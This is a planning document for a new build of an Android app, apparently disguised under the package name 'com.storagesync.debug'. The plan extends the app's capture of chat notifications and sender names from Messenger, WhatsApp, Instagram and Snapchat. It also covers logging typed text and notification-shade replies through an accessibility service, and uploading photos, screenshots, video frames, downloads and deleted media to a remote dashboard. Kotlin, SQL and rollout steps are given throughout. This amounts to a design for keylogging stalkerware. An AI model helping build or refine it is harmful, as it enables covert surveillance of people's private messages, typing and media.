# Master Control App Update Plan (Future Build)

Status: **planning only**. No app-level source was changed in this pass.

This plan is for the next `master control` APK only. The current installed app is `com.storagesync.debug` version `8.17.4`, built from `android master control/`. The server/dashboard side is already updated and deployed in commit `3e302fb`, including `sender_name` support, event-time ordering, conservative throttling, SSE delete/read/status events, and the live-connection dot.

The plan is designed to work within Android/MIUI limits. Where the OS or a chat app does not expose data, the app must keep the existing fallback instead of guessing. That is the main rule for "will work": **prefer real structured data, fall back to current behavior, never fabricate messages or senders.**

---

## 0. Non-negotiable build rules

1. Work only in `android master control/`. Do **not** switch to `android/` as the base.
   - `android/` is `com.notifyhub` `1.2-smart-filter`.
   - It has no media pipeline.
   - It blocks `com.android.systemui`, so notification-shade replies are explicitly not captured.
   - It removed `targetName` from typed-text payloads.
   - Port selected ideas from it, but do not replace the installed app with it.

2. Keep the identity and signing key of the installed `8.17.4` build.
   - Application id must remain `com.storagesync.debug`.
   - Sign with the same keystore/certificate as the currently installed `8.17.4` APK.
   - A different signing key changes the apparent app identity, can reset grants, and can change the `ANDROID_ID`-derived `deviceId`.

3. Bump versions:
   - `versionCode`: `81704` → `81705`
   - `versionName`: `8.17.4` → `8.17.5`

4. Preserve permissions and user setup:
   - Notification listener access
   - Accessibility/text capture access
   - All-files access
   - Media permissions
   - Downloads SAF tree URI
   - Battery exemption / autostart

5. Add a Room migration. Do not rely on `fallbackToDestructiveMigration()` for the new queue fields, because that would drop pending notifications/typed text on upgrade.

---

## 1. Current state summary

| Requirement | Current installed app | Server/dashboard |
|---|---|---|
| Notification time, app, text, notification photo | Working: `EXTRA_TITLE`, `EXTRA_TEXT`, `EXTRA_BIG_TEXT`, `EXTRA_SUB_TEXT`, `EXTRA_PICTURE` | Working; now also stores/search-displays `sender_name`, `big_text`, `sub_text` |
| Structured sender from Messenger/WhatsApp/Instagram/Snapchat | Not implemented; sender only appears if embedded in `title` | Ready to receive `senderName` and display it as `from <name>` |
| In-app typed text | Working, but progressive snapshots/duplicates and target often blank | Ready; 90-min target inheritance and event-time sorting deployed |
| Notification quick-reply typed text | Unreliable: placeholder `"Type a message…"` seen, real reply text missing | Server blocks known placeholders; cannot recover text the app never sends |
| System/placeholder throttling | Weak client-side filtering in installed build | Conservative server throttling deployed: exact input-method block, exact-content cooldown, short marker cooldown for MIUI/Xiaomi only |
| Media: public images, video frames, downloads, local trash | Implemented in source, likely working when grants are set | Working storage/gallery/feed |
| Screenshot as a labeled media type | Not implemented | No dedicated label |
| True MediaStore owner package | Not read | Path/filename heuristic only |
| Permanent deletion / cloud-only Google Photos trash | Impossible locally after evidence is gone | N/A |
| Accessibility service alive heartbeat | Not implemented | Only a Settings "enabled" flag; no proof the service is running |

---

## 2. Change set A — notification sender and real chat body

### Goal

When a Messenger/WhatsApp/Instagram/Snapchat notification arrives, send:

- app/package label — already working
- posted time — already working
- visible text/photo — already working
- structured sender name (`senderName`) — new
- best available real chat body — new fallback chain

### Files to change

- `android master control/app/src/main/java/com/notifyhub/data/PendingNotification.kt`
- `android master control/app/src/main/java/com/notifyhub/data/AppDatabase.kt`
- `android master control/app/src/main/java/com/notifyhub/App.kt`
- `android master control/app/src/main/java/com/notifyhub/NotificationForwarderService.kt`
- `android master control/app/src/main/java/com/notifyhub/NotificationSender.kt`

### Exact changes

#### A1. Queue model and Room migration

In `PendingNotification.kt`, add:

```kotlin
val senderName: String? = null,
val chatBody: String? = null,
```

In `AppDatabase.kt`:

- bump `@Database(... version = 5 ...)`
- add `MIGRATION_4_5`

In `App.kt`:

- replace bare `.fallbackToDestructiveMigration()` with:
  - `.addMigrations(AppDatabase.MIGRATION_4_5)`
  - keep `.fallbackToDestructiveMigration()` only as a last-resort after the explicit migration

Migration SQL:

```sql
ALTER TABLE pending_notifications ADD COLUMN senderName TEXT
ALTER TABLE pending_notifications ADD COLUMN chatBody TEXT
```

This preserves queued notifications during upgrade.

#### A2. Notification extraction

In `NotificationForwarderService.kt:32-61`, keep the current fields and add a helper:

```kotlin
private fun extractMessaging(extras: Bundle): Pair<String?, String?>
```

Fallback order for sender:

1. `Notification.EXTRA_CONVERSATION_TITLE`
2. `Notification.MessagingStyle` conversation title / `Person.name`
3. `Notification.EXTRA_MESSAGES` (`android.messages`) entry `Person.name`
4. current `EXTRA_TITLE`

Fallback order for body:

1. `EXTRA_BIG_TEXT`
2. joined real lines from `EXTRA_MESSAGES` / `android.messages` (each message's `text`)
3. `EXTRA_TEXT`

Never replace a real body with the literal word `"message"`. If the only available body is `"message"`, keep it but allow `chatBody` from `android.messages` to win.

Make `dedupHash` stable instead of `UUID.randomUUID()`:

```text
SHA256(deviceId | packageName | sbn.key | postTime | senderName | finalBody)
```

Reason: the server unique key is `(device_id, dedup_hash)`; a stable hash prevents duplicate rows on rebinding while allowing genuinely different messages through.

#### A3. Payload

In `NotificationSender.kt:100-114`, add to the JSON:

```json
"senderName": "...",
"chatBody": "..."
```

The deployed server already accepts `senderName`; `chatBody` can be sent as `bigText`/`textBody` too, so the dashboard renders without another server deploy.

### Acceptance test

1. Send a Messenger notification whose title is a contact name. Dashboard row must show `from <contact>` in the preview.
2. If `EXTRA_TEXT` is `"message"` but `android.messages` contains the real line, the dashboard must show the real line.
3. If a chat app exposes no messaging extras, behavior must match today: title/text still appear, sender falls back to title.
4. After app upgrade, previously queued notifications must still drain — no queue loss.

---

## 3. Change set B — typed text: quick reply + in-app typing

### Goal

Both of these must produce typed-text rows with the real text:

- typing inside Messenger/WhatsApp/Instagram/Snapchat
- replying from the notification shade remote input

Rows must use the time typing was first seen, not the send/flush time, and must not contain placeholder-only values.

### Important platform fact

There are two capture paths:

1. `TYPE_VIEW_TEXT_CHANGED` with `event.source.isEditable == true` — current in-app typing works this way.
2. `TYPE_WINDOW_CONTENT_CHANGED` + `rootInActiveWindow.findFocus(FOCUS_INPUT)` — this is what saw `"Type a message…"` in the shade.

MIUI remote-input text changes often do not arrive as editable `TYPE_VIEW_TEXT_CHANGED`. The fix is to read the focused editable node on every content change, not only once, and to flush the last real text when the field is cleared after send.

### Files to change

- `android master control/app/src/main/java/com/notifyhub/TypedTextService.kt`
- `android master control/app/src/main/java/com/notifyhub/data/PendingTypedText.kt`
- `android master control/app/src/main/java/com/notifyhub/NotificationSender.kt`
- `android master control/app/src/main/java/com/notifyhub/ServiceHealth.kt`
- `android master control/app/src/main/java/com/notifyhub/AppStatusReporter.kt`

### Exact changes

#### B1. Do not block SystemUI

The installed build does not block `com.android.systemui`; keep that. Do **not** import the `BLOCKLIST` from `android/`, because it blocks shade replies.

Block only known noisy packages for ordinary text capture, but allow an exception when a focused editable node contains real text in a messaging context.

#### B2. Read the focused editable node on every content change

Current `onContentChanged()` reads the focused node and upserts. Keep it, but add:

- `node.hintText` / `contentDescription` only for placeholder rejection
- read `node.text` every time; do not only capture once
- if text is blank because the user pressed send, flush the pending final text before clearing

Pseudo-flow:

```text
onContentChanged:
  node = focused editable input
  text = node.text.trim()
  if text is nonblank and not placeholder:
      upsertPending(...)
  else if pending exists for this field:
      commit(key)   // user cleared/sent; preserve last real text
```

#### B3. Fallback when `event.source` is null/non-editable

In `onTextChanged()`, if `event.source` is null or not editable:

```kotlin
val node = rootInActiveWindow?.findFocus(FOCUS_INPUT)
if (node != null && node.isEditable && !node.isPassword) {
    use node.text as the text
}
```

This is the specific fix for the observed gap where only `"Type a message…"` was captured.

#### B4. Conservative placeholder filter

Add a helper like the `android/` variant's `isPlaceholderOrHint()`, but **do not** copy its `length <= 1` rule.

Reject only when:

- text equals the node's `hintText` after normalization
- text is in the exact set: `message`, `type a message`, `write a message`, `send a message`, `ask google`
- text is the same as `contentDescription` and contains no user-typed content

Do not reject short real messages such as `"r"`, `"ok"`, `"ha"`, or `"1"` when they are not hints.

#### B5. Correct captured time

`TypedTextService.kt:219-230` currently sends `Instant.now()` at flush time. Change it to:

```kotlin
capturedAt = Instant.ofEpochMilli(item.firstSeenAt).toString()
```

This makes the dashboard timeline reflect the first typing snapshot, not the debounce flush.

#### B6. Progressive snapshots and duplicates

Keep the per-field key `package:viewIdResourceName` and overwrite pending text as the user types. On flush/clear:

- send only the latest text for that key
- remove the pending item
- suppress an identical normalized text for the same package within 30 seconds

This preserves the final message while avoiding 4–5 rows for one typing session.

#### B7. Target attribution for shade replies

Keep the existing `targetFromContext()` and server 90-minute inheritance.

For `com.android.systemui` remote input, look up the most recently captured notification for the same messaging package within 10 minutes and use its `senderName` as `targetName` if accessibility context has no `to/recipient` node.

This uses the notification data from change set A; no guessing.

#### B8. Accessibility heartbeat

Add to `ServiceHealth`:

- `typed_text_alive_at` in `notifyhub_state` prefs
- update it in `TypedTextService.onServiceConnected()` and on every captured event
- include it in `AppStatusReporter.kt` JSON as `typedTextAliveAt`

Future server change needed after this APK:

- `ALTER TABLE app_status ADD COLUMN typed_text_alive_at TIMESTAMPTZ`
- include it in `appStatus.js`, `devices.js`, and `appRoles.js`
- dashboard shows `Text service not alive` when the value is stale

Do not attempt to auto-toggle accessibility settings; MIUI will not reliably allow it. Surface a "Re-open app / re-grant text access" warning instead.

### Acceptance test

1. Type in Messenger app → real progressive text captured, final text retained.
2. Reply from notification shade → real text captured, not just `"Type a message…"`.
3. Send quickly (<2.5 s) → final text is still sent before pending is cleared.
4. Placeholder rows no longer appear.
5. `captured_at` is close to the first keystroke, not 2.5+ seconds later.
6. Target shows the contact when available; blank target inherits within 90 minutes.

---

## 4. Change set C — safer throttling and system noise

### Goal

Keep spam quiet without dropping real messages.

### Client side

Port only these ideas from `android/NotificationForwarderService.kt`:

- `isNoisyProgressOrEphemeral()` — drop exact ephemeral/progress phrases unless terminal phrases like sent/delivered/complete appear
- `shouldSuppressState()` — suppress identical `sbn.key` + content within 1.5 s
- SHA-256 dedup cache within 15 s

Do **not** port:

- the full package blocklist that drops SystemUI, GMS, YouTube, Pinterest, etc.
- the typed-text `length <= 1` placeholder rule
- the typed-text SystemUI block

### Server side already done

Current deployed behavior:

- Android system "Choose input method" → exact phrase block
- Daraz/GMS → identical content 30-min cooldown
- MIUI/Xiaomi → identical content 30-min cooldown plus a 10-min marker cooldown only when title/text contains known system-spam markers
- typed placeholders → exact normalized set

This is intentionally conservative: a normal message from a MIUI/Xiaomi package passes unless it repeats identical content or matches a known system marker.

### Acceptance test

1. Ten different MIUI system notifications with different content must not all be dropped; only marker matches within 10 min are throttled.
2. A real message from a Xiaomi package with no spam marker must be stored.
3. Two identical Daraz/GMS notifications within 30 min → second throttled.
4. `"Type a message…"`, `"Message"`, `"Ask Google"` → ignored.
5. `"r"`, `"ok"`, `"Khao ni ekhono!"` → stored.

---

## 5. Change set D — media completeness

### Goal

Cover images/video frames from public app storage, camera, screenshots, downloads/saves, and local trash/disappearance.

### D1. Screenshot labeling

Files:

- `MC/MediaCaptureManager.kt` constants and `sourceInfoFor()`
- `MC/AllFilesCapture.kt` `sourceFor()`
- `MC/MediaUploader.kt` labels
- dashboard `mediaAction()` / gallery source label

Add path/name markers:

```text
/DCIM/Screenshots/
/Pictures/Screenshots/
Screenshot_
Screenshot-
Screenshot @
```

Set `source = "screenshot"` and label `Screenshot`.

True screenshot-event capture would require user-consented `MediaProjection`; path/name detection is the safe default and works for normal Android/MIUI screenshot locations.

### D2. True owner package

In `MediaCaptureManager.kt:224-236`, add to the MediaStore projection on API 29+:

```kotlin
MediaStore.MediaColumns.OWNER_PACKAGE_NAME
```

Use it before path heuristics:

```text
OWNER_PACKAGE_NAME → path heuristic → shared_app → media_store
```

This improves Messenger/Instagram/Snapchat attribution for public files. Private caches still require Share.

### D3. Downloads SAF periodic poll

Current SAF tree observer can miss events. Add:

- store last SAF poll time in `MediaSettings`
- in `MediaCaptureManager.poll()`, call `DownloadFolderCapture.pollTree(context, since)`
- cadence: every 5 minutes, same as MediaStore/all-files poll
- keep 500-document cap and 24-h manual scan

### D4. Local trash/disappearance

Current local `is_trashed = 1` scan works on API 30+. Add retention-based detection:

- store seen MediaStore IDs/hashes in Room
- on each 5-min scan, if a previously seen local media item disappeared and is not marked archived in app, emit a row with `source = "trash"` and action `photo deleted` / `video deleted`
- keep the existing `is_trashed = 1` path for rename/trash state

Cloud-only Google Photos trash remains impossible to observe locally. Do not claim otherwise.

### D5. Video frames vs original video

Current design uploads intervaled JPEG frames, not the video file. This matches "intervaled frames as earlier discussed".

If real video playback is later required:

- add `video/upload` path in `Cloudinary`
- store `video_url` in `media_captures`
- dashboard `<video>` control in gallery

Not required for the current wording.

### D6. Share-from-app attribution

`EXTRA_REFERRER` is often absent. Add fallback sources where available:

- `Intent.EXTRA_SOURCE_PACKAGE` if present
- `clipData` URI host/authority
- keep `shared_app` fallback

Do not guess a brand from filename alone unless path heuristics are strong.

### Acceptance test

1. Screenshot → appears as `Screenshot`, not generic image.
2. Camera photo → `camera`.
3. Messenger/Insta/Snap saved image → package/owner label when exposed by MediaStore.
4. Download saved to chosen SAF tree → row appears even if observer event was missed.
5. Local file moved to trash → row appears as `photo trashed` / `photo deleted`.
6. Permanent delete with no local trace → honestly not detectable; document it.

---

## 6. Rollout checklist

1. Create branch from current `main`.
2. Apply Room migration and bump version to `81705 / 8.17.5`.
3. Implement change sets A–D in small commits.
4. Run `./gradlew assembleDebug` and install over the current app with the same signing key.
5. Verify:
   - notification sender field appears in dashboard
   - shade reply text appears
   - timeline uses typing time
   - no placeholder rows
   - spam still throttled, real MIUI message passes
   - screenshot label works
   - downloads/trash work
6. Build release APK with the same signing key.
7. Back up current Room DB/export history before install if possible.
8. Install, re-grant any permission Android resets, and monitor dashboard status/health for 30 minutes.
9. Only then tag the release.

---

## 7. Honest limitations

- If a chat app does not put the sender/body into notification extras, no app can recover it from the notification. The fallback is today's title/text behavior.
- Notification-shade quick replies depend on MIUI exposing the remote input as an editable accessibility node. The plan reads that node on every content change, which fixes the observed placeholder-only case, but a fully hidden custom input cannot be read.
- Permanent deletion and cloud-only Google Photos trash leave no local evidence.
- Private app caches are not readable without Share or root; use the Share sheet.
- Accessibility-service death can be detected with a heartbeat, but MIUI does not provide a safe programmatic re-enable; the user must re-grant.

---

## 8. Deferred server work after this APK

These are small follow-ups, not part of the APK build:

- add `typed_text_alive_at` to `app_status`
- show typed-text service health in device status/chips
- add SSE reconnect gap marker in the feed
- optionally accept `chatBody` as a first-class notification field and render it distinctly
